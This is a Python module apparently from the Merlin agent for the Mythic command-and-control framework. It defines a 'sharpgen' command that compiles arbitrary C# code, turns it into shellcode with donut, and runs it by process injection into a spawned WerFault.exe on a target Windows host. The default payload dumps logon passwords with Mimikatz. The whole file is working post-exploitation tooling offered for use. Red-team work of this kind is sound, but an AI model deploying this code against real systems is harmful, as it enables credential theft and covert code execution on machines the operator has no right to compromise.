
from merlin import MerlinJob, donut
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import os
import json
import subprocess
import shlex

# Set to enable debug output to Mythic
debug = False


class SharpGenArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            CommandParameter(
                name="code",
                type=ParameterType.String,
                description="The CSharp code you want to execute",
                default_value="Console.WriteLine(Mimikatz.LogonPasswords());",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=0,
                    required=True,
                )],
            ),
            CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="the child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=True,
                )],
            ),
            CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=2,
                    required=False,
                )],
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("code", self.command_line, ParameterType.String)


class SharpGenCommand(CommandBase):
    cmd = "sharpgen"
    needs_admin = False
    help_cmd = "sharpgen"
    description = "Use the SharpGen project to compile and execute a .NET core assembly from input CSharp code.\n" \
                  "You must use the dialog box if you want to specify the SpawnTo.\n" \
                  "SharpGen has built-in SharpSploit functionality!\n\n" \
                  "SharpGen blog post: https://cobbr.io/SharpGen.html\n" \
                  "SharpSploit Quick Command Reference: " \
                  "https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/" \
                  "SharpSploit%20-%20Quick%20Command%20Reference.md\n" \

    version = 1
    author = "@Ne0nd0g"
    argument_class = SharpGenArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f'{task.args.get_arg("code")}\n ' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        if debug:
            await MythicRPC().execute(
                "create_output",
                task_id=task.id,
                output=f'[DEBUG]Calling sharpgen() with\r\n{task.args.get_arg("code")}'
            )

        sharpgen_assembly, sharpgen_result = sharpgen(task.args.get_arg("code"))
        task.stdout += f'\n{sharpgen_result}'

        # Donut
        donut_args = {
            "params": task.args.get_arg("arguments"),
            "exit": "2",
            "verbose": True,
        }
        donut_shellcode, donut_result = donut(sharpgen_assembly, donut_args)
        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut_shellcode,
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("code")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def sharpgen(code):
    """Leverages the SharpGen project to compile arbitrary .NET 2.1 Core code into an assembly.

    This facilitates using C# "like" a scripting language because it is compiled when finished being written.
    Both SharpGen and .NET Core 2.1 must be previously installed at the fixed locations used in this function.
    SharpGen Project: https://github.com/cobbr/SharpGen

    Parameters
    ----------
    code : string
        The .NET 2.1 code to be compiled

    Returns
    -------
    bytes
        The compiled code as a .NET 2.1 Core assembly
    str
        The executed SharpGen command line string followed by SharpGen's STDOUT/STDERR text
    """

    sharpgen_args = ['dotnet', '/opt/SharpGen/bin/release/netcoreapp2.1/SharpGen.dll', '-f', 'sharpgen.exe',
                     shlex.quote(code)]

    result = subprocess.getoutput(" ".join(sharpgen_args))

    if "CompilationErrors" in result:
        raise Exception(f'There was an error compiling the code with SharpGen:\n{result}')

    with open('/opt/SharpGen/Output/sharpgen.exe', 'rb') as output:
        sharpgen_bytes = output.read()
    output.close()
    os.remove("/opt/SharpGen/Output/sharpgen.exe")

    return sharpgen_bytes, f'[SharpGen]\r\n' \
                           f'Commandline: {" ".join(sharpgen_args)}\r\n' \
                           f'{result}'

